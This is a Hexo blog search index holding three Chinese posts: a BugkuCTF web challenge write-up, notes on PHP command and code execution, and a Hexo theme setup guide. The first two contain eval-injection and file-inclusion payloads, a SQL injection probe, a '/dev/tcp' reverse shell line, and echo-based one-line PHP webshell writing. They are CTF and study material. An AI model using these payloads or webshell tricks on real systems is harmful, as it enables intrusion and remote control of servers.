      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF-write-up(WEB题)]]></title>
    <url>%2F2018%2F09%2F28%2FBugkuCTF-write-up%2F</url>
    <content type="text"><![CDATA[先放出bugkuctf网址:click me web2 进去一大片的滑稽,速度还越来越快f12看一下，嗯，得flag 计算器要求输入两个一百以内数字相加的结果，输入框限了长度审查元素更改maxlength,提交得flag web基础$_GET显示了以下代码$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 用get传值what=flag web基础$_POST$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 打开hackbarpost数据what=flag 矛盾$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; 要求num=1却不是数字php特性，提交1a (随便加个字母) web3无限弹窗flag就在这里…抓包看一下html实体编码，解一下 域名解析hint:听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag之前是自己傻x了…./etc/hosts 里加个123.206.87.240 flag.bugku.com就好了 你必须让他停下疯狂刷新…..抓包拦截得flag 本地包含 &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; 构造闭合符号就好了hello=); show_source(flag.php 没反应，尴尬hello=); print(flag.php 测试一下输出了flagphp，wtf？过滤了.换个思路hello=);print_r(file("flag.php") 变量1flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; 以为又是绕过，耗了好些时间….后来发现$$php全局变量GLOBALS，$GLOBALS可以调用，果断?args=GLOBALSget it web5hint1:jspfuckhint2:大写f12看到是jsfuck，控制台黏贴回车 头等舱什么也没有？？？抓包看看,有点意思flag在消息头 网站被黑嗯..一个黑页，翻了翻什么都没有上目录扫描器(我这里用dirsearch)用御剑的人会比较多扫到个马,先访问看看，要输密码，随便输一个试试提示不是自己的马不要乱骑…有点意思拿burp挂个字典直接爆破… 管理员系统登录框emmmm,试试万能密码记录ip，还真有点小怕怕呢~插个X-Forwarded-For: 123.206.31.85不报禁止访问了，然后?卡了一会，f12看一下有个注释dGVzdDEyMw== 是base64，解码test123目测是密码，那用户名呢?admin?root?administrator?都不是?不对，换个思路，改X-Forwarded-For: 192.168.1.1再改127.0.0.1成了，咋就忘了这个呢….尴尬 web4usl解码看看，乱七八糟，理一下格式function checkSubmit()&#123; var a=document.getElementById("password"); if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;eval(unescape(p1) + unescape('%35%34%61%61%32' + p2)); 手动拼接再解码提交67d709b2b54aa2aa648cf6e87a7114f1 flag在index里click me.点之，跳转url有东西http://120.24.86.145:8005/post/index.php?file=show.php 是文件包含，直接filter协议读index.php?file=php://filter/read=convert.base64-encode/resource=index.php 看到了’//flag:flag{edulcni_elif_lacol_si_siht}’ 输入密码查看flag120.24.86.145:8002/baopo/既然都写得这么明明白白的爆破了那就爆破吧五位数数字，要不了多久第一次没爆出来？？？是自己傻逼了，调了5递增…再爆一次 点击一百万次hints:javascriptf12看一下var clicks=0$(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;);&#125;); 代码都在这里怎么改都行了大于1000000就post个表单。。我干脆构造一个post表单提交就好了 备份是个好习惯备份，典型的源码泄露直接访问index.php.bak下载下来看一下&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125; md5相等，值不等。。php隐式转换的缺陷，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0240610708和QNKCDZO但还是有一个坑str_replace过滤了keyhttp://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO 成了 成绩单嗯，sql注入1' or 1=1# 不报错。union查询和时间盲注丢到sqlmap直接跑 秋名山老司机写个小jio本吧….# !/usr/bin/env python# coding:utf-8import requestsfrom lxml import htmlimport reurl = 'http://123.206.87.240:8002/qiumingshan/'requests = requests.Session()rs = requests.get(url)rs = html.fromstring(rs.content)rs = str(rs.xpath('//div/text()'))rs = eval(rs[2:-5])data=&#123; 'value': rs&#125;rs = requests.post(url,data=data)print rs.content 如果值名不对会提示用value:Give me value post about…. 原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND}[Finished in 0.9s] 速度要快hint:格式KEY{xxxxxxxxxxxxxx}数据包里有东西看着像base64，解码按照提示POST一个参数margin=WQpzogT0RJek9EVXc=提示让快点，脚本侍候，不行加个解码# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64url = "http://123.206.87.240:8002/web6/"session = requests.Session()rs = session.get(url).headers['flag']flag = base64.b64decode(base64.b64decode(rs).split(':')[1])payload = &#123;'margin':flag&#125;rs = session.post(url,payload)print rs.content cookies欺骗刚开始还以为真搞cookie实际上是文件包含泄漏主页源码请求url参数经过base64编码，解码发现是keys.txt,把index.php编码一下/web11/index.php?line=&amp;filename=aW5kZXgucGhw 只有一行，注意到line参数# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64for i in xrange(0,20): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" rs = requests.get(url) print rs.text 循环读一下源码&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 这下名副其实cookie欺骗了]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[命令执行那些事]]></title>
    <url>%2F2018%2F09%2F09%2Fsafe-command-exec%2F</url>
    <content type="text"><![CDATA[命令执行定义使用执行系统命令的函数时，没有进行过滤 继承web服务器权限 命令执行相关函数 system(返回最后一行) exec passthru(返回最后一行) shell_exec 作用与 反引号一致 popen(返回文件指针) proc_open(返回文件指针) pcntl_exec 多进程处理扩展,需额外安装 (string $path, array $args, array $envs) &lt;?php $w = 'whoami'; system($w); passthru($w); echo '&lt;br/&gt;'.'exec:'.exec($w).'&lt;br/&gt;'; echo 'shell_exec:'.shell_exec($w).'&lt;br/&gt;'; echo `$w`; echo popen('whoami','r'); //(cmd,mode[r,w])//读和写 proc_open('proc_open:'.$w).'&lt;br/&gt;'; pcntl_exec('pcntl_exec:'.$w).'&lt;br/&gt;';?&gt; 命令执行防御函数 escapeshellarg() //转义参数 将引号替换为空格 escapeshellcmd() //过滤整条命令(win下加^ linux加\) echo 'ls '.escapeshellarg('a"'); 过滤字符有&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %' " 在不成对情况下也过滤 代码执行相关函数 eval assert preg_replace (php&lt;=5.5) call_user_func call_user_func_array array_map 前两个就不说了，一句话常见 - preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])//搜索subject中匹配pattern的部分， 以replacement进行替换。//当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行 &lt;?php//?cmd=phpinfo()preg_replace(“/test/e”,$_GET["cmd"],”jutsttest”);?&gt; //?value=[phpinfo()]preg_replace('/\[(.*)\]/e', 'strtolower("\\1")', $_GET['value']);//strtolower("\\1")实际就是\1 而\1在正则中有自己的含义 反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 深入研究preg_replace 所以这里的 \1 实际上指定的是第一个子匹配项,即value中第一个子匹配项,达到代码执行目的 - call_user_func()- call_user_func_array()- array_map() //调用其他函数功能//第一个参数为回调函数,后面的参数为回调函数的参数$b = 'phpinfo()';call_user_func($_GET['a'], $b);//当?a=eval时就调用了eval函数而phpinfo()作为参数 命令执行常用符 Windows支持的管道符| 直接执行后边的|| 如果前面执行出错，执行后边，只能为假&amp; 如果前面语句为假则直接执行后边，前边可真可假&amp;&amp; 前边假出错，前边只能为真 Linux支持的管道符; 执行完前边执行后边| 先是后边语句执行结果|| 当前语句执行出错，执行后边&amp; 如果前边为假直接执行后边，前面可真可假&amp;&amp; 如果前边为假出错，只能为真 命令执行的奇淫技巧 绕过黑名单a1;b=s;$a$b 无回显绕过方法 弹shell，nc监听判断 nc -l -p 8080 -vvv|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1 利用DNS隧道参考文章 利用echo写马echo '&lt;?php @eval($_GET[1]);?&gt;'&gt;1.php 如果长度有限制可以追加绕过echo '&lt;?php'&gt;1.phpecho '@eval('&gt;&gt;1.phpecho '$_GET['&gt;&gt;1.phpecho '1]);'&gt;&gt;1.phpecho '?&gt;'&gt;&gt;1.php 或者用反斜杠\拼接echo "&lt;?php @eval(\\$_POST[1]); ?&gt;"\&gt;&gt; 1.php 使用单引号的时候反斜杠会写进语句的里面，所以使用双引号，然后在$的前面加一个反斜杠转义 利用ls写马通过ls -t按时间排列写马echo &gt; '?&gt;'echo &gt; '($_POST[1]);'echo &gt; '@eval'echo &gt; '&lt;?php'ls -t &gt; 1.php]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>渗透测试</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO配置教程(Next.Mist主题)]]></title>
    <url>%2F2018%2F07%2F24%2Fhexo-config%2F</url>
    <content type="text"><![CDATA[Hexo简介 hexo 一个快速简洁高效的博客框架，其基于Node.js的静态blog程序 作者是台湾的tommy351 什么？你问我为什么不用Wordpress？你猜。 采用第一种的弊端就是”Github Pages”禁了百度爬虫 呵！才不存在呢。我等小萌新没有影响的。 必要前提安装hexo前必须的程序 Node.js Git Hexo官方文档Nodejs官方文档Next官方文档 安装Nodejs#安装nodejs$ sudo git clone https://github.com/nodejs/node.gitCloning into 'node'...#修改目录权限：$ sudo chmod -R 755 node#使用 ./configure 创建编译文件，并按照：$ cd node$ sudo ./configure$ sudo make$ sudo make install#查看 node 版本：$ node --versionv11.1.0 安装Git另一片文章 安装hexo$ npm install hexo-cli -g 创建网站文件$ mkdir blog# 初始化$ hexo init blog &amp;&amp; cd blog 安装hexo插件$ npm install hexo-deployer-git --save$ npm install hexo-asset-image --save# Rss$ npm install hexo-generator-feed --save# sitemap$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save#搜索插件npm install hexo-generator-searchdb --save# 生成 SSH 公钥和密钥 默认生成在根目录的.ssh文件夹下 ~/.ssh$ ssh-keygen -t rsa # 测试 (参数 -v 进入debug模式)$ ssh -t git@github.com $ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s$ hexo d 网站配置文件 配置文件存储位置:blog/_config.yml# Hexo Configuration Hexo配置文件## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# 网站信息# 标题title: xx# 副标题subtitle: xx# 博客描述description: # 作者昵称author: xx# 网站语言，默认英语，设置简体汉语language: zh-CN# 时区，默认电脑时区timezone: Asia/Shanghai# 网址设置# 如果网站是放在子目录中，将url设置成'http://yoursite.com/child'，将root设置成'/child/'# 网址url: https://xx.github.io# 网站根目录。如果网站是放在子目录中，将root设置成'子目录名'root: /# 文章链接地址格式 。即文章存放的目录。permalink: :year/:month/:day/:title/permalink_defaults:# 目录设置# 资源文件夹，放在里面的文件会上传到github中source_dir: source# 公共文件夹，存放生成的静态文件public_dir: public# 标签文件夹，默认是tags。实际存放在source/tags中。tag_dir: tagsrss_dir: rss# 档案文件夹，默认是archives。archive_dir: archives# 分类文件夹，默认是categories。实际存放在source/categories中。category_dir: categories# 代码文件夹，默认是downloads/codecode_dir: downloads/code# 国际化文件夹，默认跟language相同i18n_dir: :lang# 不需要渲染的文件夹或文件夹,放在[]中# 这两个文件是百度和google的站长验证文件，不能渲染，否则会改变内容，不能验证过skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, 模板.md]# 写作选项# 新建博文（帖子）的默认名称# File name of new postsnew_post_name: :title.md # 默认布局模板是post，而不是draft和pagedefault_layout: post# 是否将标题转换成标题形式（首字母大写）titlecase: false # Transform title into titlecase# 在新标签页面中打开网页external_link: true # Open external links in new tabfilename_case: 0# 是否渲染草稿render_drafts: false# 启动 Asset 文件夹post_asset_folder: false# 把链接改为与根目录的相对位址relative_link: false# 显示未来的文章future: true# 代码块的设置highlight: enable: true # 使用代码高亮 line_number: true # 显示行号 auto_detect: true # 自动检测语言 tab_replace:# 分类和标签# 默认分类default_category: uncategorized# 分类别名category_map:# 标签别名tag_map:# 日期和时间格式# Hexo 使用 Moment.js 来解析和显示时间。## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# 分页配置# ---------------下面选项需要对应插件的支持---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --save## Set per_page to 0 to disable pagination# 每页显示的文章量 # per_page: 20# 首页的分页设置index_generator: per_page: 5# 归档页的分页设置archive_generator: per_page: 30 yearly: true monthly: true# 标签页的分页设置tag_generator: per_page: 20# 分页路径，在public中可以看到# pagination_dir: page# Extensions 拓展插件配置## Plugins: https://hexo.io/plugins/plugins: baidusitemap: path: baidusitemap.xml# 配置RSSfeed: # feed 类型 (atom/rss2) type: atom # rss 路径 path: atom.xml # 在 rss 中最多生成的文章数(0显示所有) limit: 0# 自定义站点内容搜索# 需要先安装插件：# npm install hexo-generator-search --savesearch: path: search.xml # 如只想索引文章，可设置为post field: all # 主题配置## Themes: https://hexo.io/themes/theme: maupassant# 部署配置## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # 部署到github repository: git@github.com:xxx/xxx.github.io.git # 分支默认master branch: maste 主题美化修改文章底部的那个带#号的标签修改模板/themes/next/layout/_macro/post.swig搜索 rel=”tag”&gt;#，将 # 换成 &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束,感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开\themes\next\layout_macro\post.swig文件在post-body 之后， post-footer之前添加&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 然后在主题配置文件中最后加入# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 修改作者头像并旋转打开\themes\next\source\css_common\components\sidebar\sidebar-author.styl在里面添加如下代码：.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125; 主页文章添加阴影效果打开\themes\next\source\css_custom\custom.styl,向里面加入： // 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 美化参考文章]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
